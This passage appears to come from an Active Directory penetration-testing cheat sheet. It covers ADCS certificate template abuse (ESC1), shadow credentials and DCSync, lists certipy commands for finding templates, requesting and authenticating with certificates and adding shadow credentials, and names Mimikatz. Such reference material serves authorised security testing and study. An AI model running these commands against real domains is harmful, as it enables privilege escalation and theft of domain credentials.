6. ADCS Attacks (ESC1–ESC8)

Active Directory Certificate Services misconfigurations can allow privilege escalation.

Find certificate templates
certipy find
ESC1 Exploitation
certipy req -u user@domain.local -p password -template vulnerable_template
Authenticate with certificate
certipy auth -pfx certificate.pfx


7. Shadow Credentials Attack

Shadow credentials allow attackers to add authentication keys to user objects.

Add shadow credential
certipy shadow add
Authenticate
certipy auth


8. DCSync Attack

DCSync allows replication of domain credentials.

Mimikatz
